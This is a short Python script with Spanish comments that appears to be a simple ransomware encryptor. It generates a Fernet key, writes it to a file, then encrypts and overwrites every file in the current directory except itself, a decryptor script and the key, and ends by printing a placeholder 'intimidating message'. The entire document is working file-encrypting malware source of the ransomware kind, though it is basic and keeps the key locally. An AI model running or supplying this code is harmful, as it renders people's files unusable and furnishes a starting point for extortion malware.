#!/usr/bin/env python3

import os #Para listar los archivos
from cryptography.fernet import Fernet #Para cifrar los archivos

#Generamos la llave
llave=Fernet.generate_key()

#Guardamos la llave en un archivo
with open("laLlave.key","wb") as laLlave:
	laLlave.write(llave)

#Guardamos los archivos que son parte del script
archivosprotegidos = ["encriptador.py",
	"desencriptador.py",
	"laLlave.key"]

#Recorremos los archivos de la carpeta
for archivo in os.listdir():
	#Limpiamos los archivos protegidos y subcarpetas 
	if archivo not in archivosprotegidos and os.path.isfile(archivo):
	
		#Abrimos el archivo en lectura binaria
		with open(archivo,"rb") as elArchivo:
			#Guardamos el contenido
			contenido = elArchivo.read()

		#Ciframos el contenido
		contenidoEncriptado = Fernet(llave).encrypt(contenido)

		#Abrimos el archivo en escritura binaria
		with open(archivo,"wb") as elArchivo:
			#Reescribimos con el contenido cifrado
			elArchivo.write(contenidoEncriptado)

print("Mensaje intimidante")









